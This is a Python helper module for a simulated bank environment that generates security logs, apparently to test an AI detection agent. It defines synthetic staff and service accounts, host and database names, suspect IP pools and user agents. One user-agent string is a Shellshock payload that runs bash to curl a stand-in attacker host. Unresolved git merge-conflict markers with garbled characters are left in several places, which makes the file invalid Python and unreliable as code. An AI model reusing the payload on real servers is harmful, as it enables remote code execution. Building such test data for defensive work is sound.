"""
Shared helpers and data pools used by every log generator.

This module is the *world model* for the simulated bank environment:
  - 100 banking personas (tellers, loan officers, devs, service accts, vendors)
  - 20 of them are marked "noisy" -> these are the only users that scenarios
    will target/compromise. The other 80 only produce benign activity.
  - Banking-flavored host/database/network pools
  - Time/format helpers used by every generator
  - All legacy names (USERNAMES, PRIV_USERS, ATTACKER_IPS, etc.) preserved
    so older generator code keeps working.
"""
import random
from datetime import datetime, timedelta, timezone

# -------------------------------------------------------------------------
# Reproducibility
# -------------------------------------------------------------------------
# Comment the next line and uncomment the random.seed(42) line for
# deterministic output across runs (useful for regression tests of AI agent).
random.seed()
# random.seed(42)


# =========================================================================
# IDENTITY POPULATION
# =========================================================================
# A real bank has tellers, loan officers, branch managers, IT, devs, ops,
# service accounts and third-party vendor accounts. We model 100 of them.
# =========================================================================

# Naming pools used to synthesize 80 "ordinary" banking users
_FIRST_NAMES = [
    "ahmad", "sara", "rami", "lina", "khalil", "nour", "elie", "rita",
    "fadi", "joelle", "samir", "maya", "tarek", "rana", "hadi", "yara",
    "ziad", "dana", "marwan", "nadia", "omar", "layla", "jad", "carla",
    "wassim", "rasha", "majd", "tala", "imad", "sahar", "georges", "mira",
    "anthony", "rebecca", "michel", "diana", "bilal", "sophie", "habib", "mona",
    "kamal", "noha", "salim", "rola", "issam", "houda", "ayman", "jana",
    "naji", "lara",
]
_LAST_NAMES = [
    "haddad", "khoury", "nasr", "saliba", "abou", "kassis", "tannous",
    "moukarzel", "boutros", "geagea", "hourani", "abboud", "chamoun",
    "matar", "saade", "naim", "fares", "ghanem", "antoun", "azar",
    "rizk", "younan", "issa", "saad", "nakhle",
]
_ROLES = [
    # role             , dept             , privilege_tier   , normal_hours
    ("teller",            "branch_ops",       "user",            (7, 19)),
    ("teller",            "branch_ops",       "user",            (7, 19)),
    ("loan_officer",      "lending",          "user",            (8, 18)),
    ("loan_officer",      "lending",          "user",            (8, 18)),
    ("relationship_mgr",  "private_banking",  "user",            (8, 19)),
    ("branch_manager",    "branch_ops",       "manager",         (7, 20)),
    ("compliance_analyst","compliance",       "user",            (8, 18)),
    ("aml_analyst",       "compliance",       "user",            (8, 18)),
    ("fraud_analyst",     "fraud_ops",        "user",            (0, 24)),  # 24x7 shifts
    ("treasury_dealer",   "treasury",         "user",            (7, 19)),
    ("operations_clerk",  "back_office",      "user",            (7, 18)),
    ("operations_clerk",  "back_office",      "user",            (7, 18)),
    ("payments_ops",      "payments",         "user",            (0, 24)),  # 24x7
    ("hr_specialist",     "hr",               "user",            (8, 18)),
    ("finance_analyst",   "finance",          "user",            (8, 18)),
    ("auditor",           "internal_audit",   "user",            (8, 18)),
    ("developer",         "it_dev",           "user",            (9, 22)),
    ("developer",         "it_dev",           "user",            (9, 22)),
    ("dba",               "it_ops",           "manager",         (0, 24)),
    ("sysadmin",          "it_ops",           "manager",         (0, 24)),
]


def _build_population():
    """
    Produce a deterministic-ish list of 100 users.

    Structure of each entry:
        {
          "username":    "ahmad.haddad",
          "displayname": "Ahmad Haddad",
          "role":        "teller",
          "dept":        "branch_ops",
          "privilege":   "user" | "manager" | "admin" | "service" | "vendor",
          "hours":       (start_hour, end_hour),
          "home_ip":     "10.x.x.x"  # workstation/VPN
        }
    """
    pop = []

    # --- 70 ordinary humans, one per role-slot, padded with extras ----------
    rng = random.Random(20260101)  # stable across runs for the *names*
    for i in range(70):
        f = rng.choice(_FIRST_NAMES)
        l = rng.choice(_LAST_NAMES)
        role, dept, priv, hrs = _ROLES[i % len(_ROLES)]
        uname = f"{f}.{l}"
        # avoid dupes
        n = 1
        base = uname
        while any(u["username"] == uname for u in pop):
            n += 1
            uname = f"{base}{n}"
        pop.append({
            "username": uname,
            "displayname": f"{f.title()} {l.title()}",
            "role": role,
            "dept": dept,
            "privilege": priv,
            "hours": hrs,
            "home_ip": f"10.{rng.randint(10,15)}.{rng.randint(0,255)}.{rng.randint(10,250)}",
        })

    # --- 10 IT admins / privileged accounts --------------------------------
    admin_names = ["jzghendy", "msaliba", "rkhoury.adm", "tabboud.adm",
                   "sysadm1", "sysadm2", "netadm1", "winadm1",
                   "dbadm1", "secops1"]
    for name in admin_names:
        pop.append({
            "username": name,
            "displayname": name.replace(".", " ").title(),
            "role": "sysadmin", "dept": "it_ops",
            "privilege": "admin", "hours": (0, 24),
            "home_ip": f"10.50.0.{rng.randint(10, 80)}",
        })

    # --- 10 service accounts ----------------------------------------------
    service_accts = [
        "svc_sql",          # MSSQL service
        "svc_mysql",        # MySQL service
        "svc_backup",       # Veeam/etc
        "svc_iis",          # webserver app pool
        "svc_swift",        # SWIFT gateway
        "svc_corebank",     # core banking integration
        "svc_cards",        # card switch
        "svc_scanner",      # vuln scanner
        "svc_monitor",      # nagios/zabbix
        "svc_replication",  # db replication
    ]
    for s in service_accts:
        pop.append({
            "username": s,
            "displayname": s,
            "role": "service_account", "dept": "infrastructure",
            "privilege": "service", "hours": (0, 24),
            "home_ip": f"10.60.0.{rng.randint(10, 60)}",
        })

    # --- 5 third-party vendor accounts (the soft underbelly) --------------
    vendors = [
        ("vendor_temenos", "Temenos T24 Support"),
        ("vendor_swift", "SWIFT Field Engineer"),
        ("vendor_fiserv", "Fiserv Cards Integration"),
        ("vendor_msft", "Microsoft Premier Support"),
        ("vendor_consult", "External Consultant"),
    ]
    for v, dn in vendors:
        pop.append({
            "username": v,
            "displayname": dn,
            "role": "vendor", "dept": "external",
            "privilege": "vendor", "hours": (8, 20),
            # vendors typically connect via dedicated VPN range
            "home_ip": f"10.70.0.{rng.randint(10, 50)}",
        })

    # --- 5 generic well-known accounts that any attacker targets -----------
    for u in ["administrator", "guest", "sa", "root", "kerberos"]:
        if not any(x["username"] == u for x in pop):
            pop.append({
                "username": u, "displayname": u.title(),
                "role": "builtin", "dept": "system",
                "privilege": "admin" if u in ("administrator", "sa", "root") else "user",
                "hours": (0, 24),
                "home_ip": "0.0.0.0",
            })

    return pop[:100]


# Build it once at import time
POPULATION = _build_population()
assert len(POPULATION) == 100, f"expected 100 users, got {len(POPULATION)}"

# Index by username for fast lookup
USERS_BY_NAME = {u["username"]: u for u in POPULATION}

# -------------------------------------------------------------------------
# Subset selection: 20 "noisy" users
# -------------------------------------------------------------------------
# These are the only accounts that scenarios will target/compromise.
# We pick a deliberate mix:
#   - 4 privileged (admins/managers)   -> high-value targets
#   - 4 service accounts               -> classic post-compromise abuse
#   - 2 vendors                        -> supply-chain risk
#   - 10 ordinary users                -> phishing victims
# -------------------------------------------------------------------------
def _pick_noisy(pop):
    rng = random.Random(20260201)
    privileged = [u for u in pop if u["privilege"] in ("admin", "manager")]
    services   = [u for u in pop if u["privilege"] == "service"]
    vendors    = [u for u in pop if u["privilege"] == "vendor"]
    ordinary   = [u for u in pop if u["privilege"] == "user"]
    chosen = (
        rng.sample(privileged, min(4, len(privileged))) +
        rng.sample(services,   min(4, len(services))) +
        rng.sample(vendors,    min(2, len(vendors))) +
        rng.sample(ordinary,   min(10, len(ordinary)))
    )
    return chosen


NOISY_USERS = _pick_noisy(POPULATION)
NOISY_USERNAMES = {u["username"] for u in NOISY_USERS}
NORMAL_USERS = [u for u in POPULATION if u["username"] not in NOISY_USERNAMES]


# =========================================================================
# LEGACY ALIASES (so old generators still work without code changes)
# =========================================================================
USERNAMES = [u["username"] for u in POPULATION]
PRIV_USERS = [u["username"] for u in POPULATION
              if u["privilege"] in ("admin", "manager")] + ["administrator", "sa", "root"]
# Dedup + stable order
PRIV_USERS = sorted(set(PRIV_USERS))


# =========================================================================
<<<<<<< HEAD
# HOSTS — banking infrastructure naming, generic OS
=======
# HOSTS â€” banking infrastructure naming, generic OS
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
# =========================================================================
HOSTS = [
    # Domain controllers
    "DC01.bank.local", "DC02.bank.local",
    # Core banking & related
    "COREBANK01.bank.local", "COREBANK02.bank.local",
    "T24-APP01.bank.local",          # Temenos T24 application server
    "CARDS-SW01.bank.local",         # card switch
    "SWIFT-GW01.bank.local",         # SWIFT gateway
    "LOAN-APP01.bank.local",
    # Database servers
    "SQL01.bank.local", "SQL02.bank.local",
    "MYSQL01.bank.local",
    # Web tier
    "IBANK-WEB01.bank.local",        # internet banking
    "IBANK-WEB02.bank.local",
    "MOBILE-API01.bank.local",
    # File / mail / backup
    "FILE01.bank.local", "MAIL01.bank.local", "BACKUP01.bank.local",
    # Workstations - branches & HQ departments
    "WS-BRANCH-12.bank.local", "WS-BRANCH-04.bank.local",
    "WS-FIN-04.bank.local", "WS-HR-09.bank.local",
    "WS-LOAN-22.bank.local", "WS-IT-17.bank.local",
    "WS-COMPL-08.bank.local", "WS-TREAS-03.bank.local",
]
HOSTS_DC      = [h for h in HOSTS if h.startswith("DC")]
HOSTS_DB      = [h for h in HOSTS if any(p in h for p in ("SQL", "MYSQL"))]
HOSTS_WEB     = [h for h in HOSTS if "WEB" in h or "API" in h]
HOSTS_BANKING = [h for h in HOSTS if any(p in h for p in
                                         ("COREBANK", "T24", "CARDS", "SWIFT", "LOAN"))]
HOSTS_WS      = [h for h in HOSTS if h.startswith("WS-")]

DOMAINS = ["BANK", "CORP", "BANK.LOCAL"]


# =========================================================================
<<<<<<< HEAD
# DATABASES — used by MSSQL and MySQL generators
=======
# DATABASES â€” used by MSSQL and MySQL generators
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
# =========================================================================
DATABASES_BANKING = [
    "CORE_BANKING",      # accounts, balances, transactions
    "CARDS_PROD",        # card issuance & switch
    "LOAN_ORIG",         # loan origination
    "AML_CASES",         # AML/compliance case mgmt
    "FRAUD_RULES",       # fraud engine rules
    "TREASURY_POS",      # treasury positions
    "CUSTOMER_360",      # CRM/KYC
    "PAYMENTS",          # SWIFT/SEPA/ACH ledger
    "GL_ACCOUNTING",     # general ledger
    "REPORTING_DWH",     # data warehouse
    "HR_DB",
    "AUDIT_LOG",
]
DATABASES_SENSITIVE = ["CORE_BANKING", "CARDS_PROD", "PAYMENTS",
                       "TREASURY_POS", "AML_CASES"]


# =========================================================================
# NETWORK POOLS
# =========================================================================
<<<<<<< HEAD
# Internal LAN — corporate workstations
=======
# Internal LAN â€” corporate workstations
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
INTERNAL_IPS = [
    "10.10.1.15", "10.10.1.22", "10.10.2.50", "10.10.3.101",
    "10.11.0.45", "10.12.0.77", "10.13.0.120",
    "192.168.1.10", "192.168.1.45", "172.16.10.20",
]
# Server VLANs
SERVER_IPS = [
    "10.20.0.10", "10.20.0.11", "10.20.0.20",   # DCs
    "10.20.1.10", "10.20.1.11",                 # SQL
    "10.20.2.10", "10.20.2.11",                 # web
    "10.20.3.10", "10.20.3.11",                 # core banking
    "10.20.4.10",                               # SWIFT
]
# VPN range (remote employees + vendors)
VPN_IPS = [f"10.70.0.{i}" for i in range(10, 60)]
# Branch office NAT egress
BRANCH_IPS = ["10.80.1.1", "10.80.2.1", "10.80.3.1"]

<<<<<<< HEAD
# External — known-bad / suspect
=======
# External â€” known-bad / suspect
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
EXTERNAL_IPS = [
    "185.220.101.45",   # TOR exit
    "185.220.102.8",    # TOR exit
    "45.155.205.233",   # scanner
    "192.241.220.18",
    "5.188.206.14",     # bulletproof hosting
    "118.25.6.39",      # mass scanner
    "23.94.157.88",
    "194.165.16.71",    # known C2
    "194.26.135.115",   # malicious infra
    "91.219.236.27",    # phishing infra
    "203.0.113.7",      # TEST-NET-3
    "198.51.100.42",    # TEST-NET-2
]
# Subsets by attacker "profile"
TOR_EXITS         = ["185.220.101.45", "185.220.102.8"]
SCANNER_IPS       = ["45.155.205.233", "118.25.6.39", "192.241.220.18"]
C2_IPS            = ["194.165.16.71", "194.26.135.115", "5.188.206.14"]
PHISHING_IPS      = ["91.219.236.27", "23.94.157.88"]
ATTACKER_IPS      = TOR_EXITS + SCANNER_IPS + C2_IPS   # legacy alias


# =========================================================================
# USER AGENTS
# =========================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "curl/7.81.0",
    "python-requests/2.31.0",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "() { :; }; /bin/bash -c \"curl http://evil.example/x\"",   # shellshock UA
    "BankMobileApp/4.7.1 (iOS 17.4; iPhone15,3)",               # legitimate
    "BankMobileApp/4.7.1 (Android 13; SM-S918B)",               # legitimate
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",  # very old IE
    "Go-http-client/1.1",
    "Java/1.8.0_362",
]


# =========================================================================
# TIME HELPERS
# =========================================================================
def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def rand_recent(max_minutes: int = 60) -> datetime:
    """Random timestamp within the last `max_minutes`."""
    return now_utc() - timedelta(seconds=random.randint(0, max_minutes * 60))


def rand_business_hours(max_minutes: int = 60) -> datetime:
    """Random recent timestamp biased toward business hours (8-18 UTC)."""
    for _ in range(5):
        ts = rand_recent(max_minutes)
        if 8 <= ts.hour <= 18:
            return ts
    return rand_recent(max_minutes)


def iso_z(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}Z"


def syslog_ts(ts: datetime) -> str:
    return ts.strftime("%b %d %H:%M:%S")


def apache_ts(ts: datetime) -> str:
    return ts.strftime("[%d/%b/%Y:%H:%M:%S +0000]")


def palo_ts(ts: datetime) -> str:
    return ts.strftime("%Y/%m/%d %H:%M:%S")


# =========================================================================
# MISC HELPERS
# =========================================================================
def pick(seq):
    return random.choice(seq)


def maybe(prob: float) -> bool:
    return random.random() < prob


def pick_normal_user() -> dict:
    """Return a user dict from the 80 'quiet' users (no alerts)."""
    return random.choice(NORMAL_USERS)


def pick_noisy_user() -> dict:
    """Return a user dict from the 20 'noisy' users (scenarios target these)."""
    return random.choice(NOISY_USERS)


def pick_any_user() -> dict:
    return random.choice(POPULATION)


def pick_user_by_role(role: str) -> dict:
    """Find any user with a given role; falls back to random if none."""
    matches = [u for u in POPULATION if u["role"] == role]
<<<<<<< HEAD
    return random.choice(matches) if matches else pick_any_user()
=======
    return random.choice(matches) if matches else pick_any_user()
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
